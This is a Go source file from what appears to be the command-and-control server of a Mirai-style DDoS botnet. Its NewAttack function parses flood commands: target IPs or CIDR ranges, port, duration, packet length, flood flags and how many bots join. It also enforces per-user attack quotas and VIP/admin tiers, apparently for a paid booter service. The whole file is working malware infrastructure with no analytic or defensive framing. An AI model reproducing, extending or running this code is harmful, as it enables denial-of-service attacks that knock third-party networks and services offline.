package attacks

import (
	"cnc/core/database"
	"encoding/binary"
	"errors"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/mattn/go-shellwords"
)

var GlobalAttacks = true
var MaxGlobalSlots = 1

type AttackInfo struct {
	ID          uint8
	Flags       []uint8
	Description string
	Vip         bool
	Admin       bool
	Disabled    string
}

type Attack struct {
	Duration    uint32
	Type        uint8
	Targets     map[uint32]uint8
	Flags       map[uint8]string
	BotCount    int
	FullCommand string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int, username string) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string), -1, str}
	args, _ := shellwords.Parse(str)

	userTotalAttacks, err1 := database.DatabaseConnection.GetUserTotalAttacks(username)
	if err1 != nil {
		return nil, err1
	}

	maxAttacks, err2 := database.DatabaseConnection.GetMaxAttacks(username)
	if err2 != nil {
		return nil, err2
	}

	if userTotalAttacks >= maxAttacks {
		return nil, ErrNoAttacksLeft
	}

	isVip, err3 := database.DatabaseConnection.IsVip(username)
	if err3 != nil {
		return nil, err3
	}

	isAdmin, err3 := database.DatabaseConnection.IsAdmin(username)
	if err3 != nil {
		return nil, err3
	}

	if !GlobalAttacks {
		return nil, ErrAttacksDisabled
	}

	var atkInfo AttackInfo

	if len(args) == 0 {
		return nil, errors.New("")
	} else {

		var exists bool
		method := args[0]
		atkInfo, exists = attackInfoLookup[method]
		if !exists {
			return nil, errors.New("")
		}

		if atkInfo.Vip && !isVip {
			return nil, errors.New("\u001B[91myou require \u001B[96mvip\u001B[91m permissions to use this")
		}

		if atkInfo.Admin && !isAdmin {
			return nil, errors.New("\u001B[91myou require \u001B[96madmin\u001B[91m permissions to use this")
		}

		if atkInfo.Disabled != "" {
			return nil, errors.New("\x1b[91mthis attack is disabled\u001B[0m: " + atkInfo.Disabled)
		}

		atk.Type = atkInfo.ID
	}

	method := args[0]
	args = args[1:]

	if len(args) < 4 {
		return nil, errors.New("\x1b[91m" + method + " <target> <port> <duration> <len> [...options]")
	}

	// Target parsing (args[0])
	cidrArgs := strings.Split(args[0], ",")
	if len(cidrArgs) > 255 {
		return nil, ErrTooManyTargets
	}
	for _, cidr := range cidrArgs {
		prefix := ""
		netmask := uint8(32)
		cidrInfo := strings.Split(cidr, "/")
		if len(cidrInfo) == 0 {
			return nil, ErrBlankTarget
		}
		prefix = cidrInfo[0]
		if len(cidrInfo) == 2 {
			netmaskTmp, err := strconv.Atoi(cidrInfo[1])
			if err != nil || netmaskTmp > 32 || netmaskTmp < 0 {
				return nil, ErrInvalidCidr
			}
			netmask = uint8(netmaskTmp)
		} else if len(cidrInfo) > 2 {
			return nil, ErrTooManySlashes
		}

		ip := net.ParseIP(prefix)
		if ip == nil {
			// Try DNS resolution for hostnames
			resolvedIPs, err := net.LookupHost(prefix)
			if err != nil || len(resolvedIPs) == 0 {
				return nil, ErrInvalidHost
			}
			ip = net.ParseIP(resolvedIPs[0])
			if ip == nil {
				return nil, ErrInvalidHost
			}
		}
		atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
	}

	// Port parsing (args[1])
	atk.Flags[7] = args[1]

	// Duration parsing (args[2])
	duration, err := strconv.Atoi(args[2])
	if err != nil || duration == 0 || duration > 999 {
		return nil, ErrInvalidDuration
	}
	atk.Duration = uint32(duration)

	// Length parsing (args[3])
	atk.Flags[0] = args[3]

	args = args[4:]

	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\x1b[97mvalid flags for this flood (key=value) are:\r\n\r\n"
			for _, flagID := range atkInfo.Flags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\nvalue of 65535 denotes 0 (random)\r\n"
			validFlags += "for example: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, ErrInvalidKeyVal
		}

		flagKey := flagSplit[0]
		flagValue := strings.TrimSpace(flagSplit[1])

		if flagKey == "count" {
			count, err := strconv.Atoi(flagValue)
			if err != nil || count < -1 {
				return nil, errors.New("invalid count value (must be >= -1, where -1 means all bots)")
			}
			atk.BotCount = count
			args = args[1:]
			continue
		}

		flagInfo, exists := flagInfoLookup[flagKey]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.Flags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, ErrInvalidFlag
		}

		if strings.HasPrefix(flagValue, "\"") && strings.HasSuffix(flagValue, "\"") {
			flagValue = flagValue[1 : len(flagValue)-1]
		} else if flagValue == "true" {
			flagValue = "1"
		} else if flagValue == "false" {
			flagValue = "0"
		}

		atk.Flags[flagInfo.flagID] = flagValue
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, ErrTooManyFlags
	}

	for key, val := range atk.Flags {
		if (key == 6 || key == 7) && val == "0" {
			rand.Seed(time.Now().UnixNano())
			atk.Flags[key] = strconv.Itoa(rand.Intn(65536))
		}
	}

	return atk, nil
}
